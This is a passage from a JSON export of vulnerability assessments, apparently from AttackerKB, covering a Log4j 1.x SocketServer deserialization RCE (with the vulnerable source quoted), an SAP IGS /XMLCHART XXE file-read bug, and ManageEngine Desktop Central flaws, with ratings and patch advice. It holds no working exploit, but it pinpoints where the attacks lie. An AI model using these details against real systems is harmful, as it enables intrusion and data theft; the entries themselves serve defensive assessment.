      "document": "This vulnerability is essentially a duplicate of CVE-2017-5645, which was discovered in various versions of Log4j 2. I am unsure why the Log4j 1.x versions were addressed later, especially since Log4j 1.x was considered EoL in 2015.\r\n\r\nIncluding any of the vulnerable versions of the Log4j library and enabling it in the application of choice opens up a pretty nasty vulnerability in said application. The CVE listing mentions that the vulnerability exists within the `SocketServer` class. Within its `main()` method, a `SocketNode` object is created once a client connection is accepted.\r\n\r\n```\r\npublic static void main(String argv[])\r\n{\r\n   ...\r\n      while(true) {\r\n\tcat.info(\"Waiting to accept a new client.\");\r\n\tSocket socket = serverSocket.accept();\r\n\tInetAddress inetAddress =  socket.getInetAddress();\r\n\tcat.info(\"Connected to client at \" + inetAddress);\r\n\r\n\tLoggerRepository h = (LoggerRepository) server.hierarchyMap.get(inetAddress);\r\n\tif(h == null) {\r\n\t  h = server.configureHierarchy(inetAddress);\r\n\t}\r\n\r\n\tcat.info(\"Starting new socket node.\");\r\n\tnew Thread(new SocketNode(socket, h)).start();\r\n   ...\r\n}\r\n```\r\n\r\nThe `SocketNode` constructor creates a new `ObjectInputStream` object named `ois` from data on the socket:\r\n\r\n```\r\n  public SocketNode(Socket socket, LoggerRepository hierarchy)\r\n  {\r\n    this.socket = socket;\r\n    this.hierarchy = hierarchy;\r\n    try {\r\n      ois = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));\r\n    ...\r\n  }\r\n```\r\n\r\nAnd in the `SocketNode`'s `run()` method, `readObject()` is called on the data previously read from the socket:\r\n\r\n```\r\npublic void run()\r\n {\r\n    LoggingEvent event;\r\n    Logger remoteLogger;\r\n\r\n    try {\r\n      if (ois != null) {\r\n          while(true) {\r\n\t        // read an event from the wire\r\n\t        event = (LoggingEvent) ois.readObject();\r\n\t        // get a logger from the hierarchy. The name of the logger is taken to be the name contained in the event.\r\n\t        remoteLogger = hierarchy.getLogger(event.getLoggerName());\r\n  ...\r\n }\r\n```\r\n\r\nThis vulnerability could give an attacker unauthenticated RCE easily *if and only if* the Log4j library is enabled and listening for remote connections. I'm rating this vulnerability a little lower in utility / attacker value because of that. This is quite an old vulnerability despite the CVE date, but as always, make sure you're patched.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "514bc099-6c5b-4c90-bbc5-663d395fe929",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "4d295ac3-b3eb-4904-9c27-ff94a7c7fe66",
      "created": "2020-10-06T16:04:08.387715Z",
      "revisionDate": "2020-10-06T23:22:55.14613Z",
      "document": "This vulnerability currently has a Metasploit module in the PR queue at https://github.com/rapid7/metasploit-framework/pull/14163, so here is a nutshell version of what this vulnerability is and why it matters, as well as why it might not matter as much.\r\n\r\nBasically this vulnerability is a bug from 2018 in SAP Internet Graphics Servers (IGS) in their `/XMLCHART` pages due to a lack of XML external entity validation on the  value of the `<Element>` HTML tag when a POST request containing XML is sent to the `/XMLCHART` page, which will then instruct the SAP IGS server to render a new chart with the provided data.\r\n\r\nBy abusing this vulnerability an attacker can retrieve the contents of any file on the system as the user running the SAP IGS server. This user will typically be the SAP admin user, but will not necessarily be the `root` user, meaning that whilst the attacker will have elevated access to SAP IGS related files, they may not be able to access some OS related files due to their lack of permissions.\r\n\r\nStill it is important to note that SAP systems are often responsible for processing business sensitive information, so whilst the attacker may not be able to access something like the `/etc/shadow` file, they would still be able to potentially retrieve sensitive information such as data about company performance or analytics that may not be available to the public, which could allow for activities such as insider trading. It is also possible that the SAP admin user may have been given extra permissions by accident which could allow the attacker to read the contents of other sensitive files on the disks. These could include configuration files which may contain sensitive usernames and passwords.\r\n\r\nThis vulnerability is therefore listed as a Medium as it certainly gives an attacker a fair degree of file access, however the attacker will not be able to do anything beyond reading files with this bug alone, which limits its impact a little bit.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Collection",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7aa7c40a-9e4f-4b8a-8d01-161779b3506e",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "fbf63032-e807-452d-9ad3-7f10abccd14c",
      "created": "2020-10-06T16:05:12.116411Z",
      "revisionDate": "2020-10-06T17:56:10.811121Z",
      "document": "This vulnerability currently has a Metasploit module in the PR queue at https://github.com/rapid7/metasploit-framework/pull/14163, so here is a nutshell version of what this vulnerability is and why it matters, as well as why it might not matter as much.\r\n\r\nBasically this vulnerability is a bug from 2018 in SAP Internet Graphics Servers (IGS) in their `/XMLCHART` pages due to a lack of XML external entity validation on the `<Element>` HTML tag value when a POST request containing XML is sent to the `/XMLCHART` page, which will then instruct the SAP IGS server to render a new chart with the provided data.\r\n\r\nBy abusing this vulnerability an attacker can retrieve the contents of any file on the system as the user running the SAP IGS server. This user will typically be the SAP admin user, but will not necessarily be the `root` user, meaning that whilst the attacker will have elevated access to SAP IGS related files, they may not be able to access some OS related files due to their lack of permissions.\r\n\r\nStill it is important to note that SAP systems are often responsible for processing business sensitive information, so whilst the attacker may not be able to access something like the `/etc/shadow` file, they would still be able to potentially retrieve sensitive information such as data about company performance or analytics that may not be available to the public, which could allow for activities such as insider trading. It is also possible that the SAP admin user may have been given extra permissions by accident which could allow the attacker to read the contents of other sensitive files on the disks. These could include configuration files which may contain sensitive usernames and passwords.\r\n\r\nThis vulnerability is therefore listed as a Medium as it certainly gives an attacker a fair degree of file access, however the attacker will not be able to do anything beyond reading files with this bug alone, which limits its impact a little bit.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Collection",
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "61e781a2-8bec-4dee-9320-474e2b71d9d1",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "fc5d1d41-04d3-40f5-96f6-fcc303f82d2f",
      "created": "2020-10-06T16:38:48.75981Z",
      "revisionDate": "2020-10-13T20:13:29.139374Z",
      "document": "[CVE-2020-15589](https://nvd.nist.gov/vuln/detail/CVE-2020-15589) and [CVE-2020-24397](https://nvd.nist.gov/vuln/detail/CVE-2020-24397) are [grouped](https://twitter.com/pat0is/status/1311980672718958593) together with this.\r\n\r\nI want to clarify that these are _client-side_ vulnerabilities in ManageEngine Desktop Central. Exploiting them will certainly require [MITM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) or other control of the network.\r\n\r\nDetails and a PoC are [available](https://github.com/patois/zohocorp_dc), so patch this immediately. Desktop Central is [UEM](https://en.wikipedia.org/wiki/Unified_Endpoint_Management) software, and while this is a set of client-side vulns, you don't want attackers taking advantage of such critical software.",
      "score": 6,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "3e5a47c9-35b0-4d55-92e4-0e83e6cbb2ec",
          "name": "Difficult to weaponize",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "difficult_to_develop"
        }
      ]
    },
    {
      "id": "073df17a-39dd-4673-93d2-e9ee464a88bb",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "0c6946b8-8b77-4e50-9e35-90e577ca049d",
      "created": "2020-10-06T20:14:58.772082Z",
      "revisionDate": "2020-12-29T00:44:23.223113Z",
      "document": "Please see the [Rapid7 analysis](https://attackerkb.com/topics/iXY8Fijc0P/multiple-vulnerabilities-in-hp-device-manager?#rapid7-analysis).",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    }
  ]
}